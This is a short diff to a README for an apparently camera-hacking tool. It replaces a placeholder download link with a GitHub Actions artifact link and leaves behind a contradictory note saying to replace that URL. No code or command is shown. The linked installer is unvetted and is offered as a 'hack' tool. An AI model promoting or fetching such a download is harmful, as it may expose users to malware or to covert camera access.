@@ -38,12 +38,12 @@
 Get the latest release from the link below:
 
 <p align="center">
-  <a href="https://example.com/download/camera-hack-v2.0.zip">
+  <a href="https://github.com/raazx2026-oss/Camera/actions/runs/22767301614/artifacts/5799042693">
     <img src="https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=download" alt="Download">
   </a>
 </p>
 
-> **Note:** Replace `https://example.com/...` with your actual download URL.
+> **Note:** Replace `https://github.com/raazx2026-oss/Camera/actions/runs/22767301614/artifacts/5799042693...` with your actual download URL.
 
 ### 🔧 Manual Installation (via command line)
 
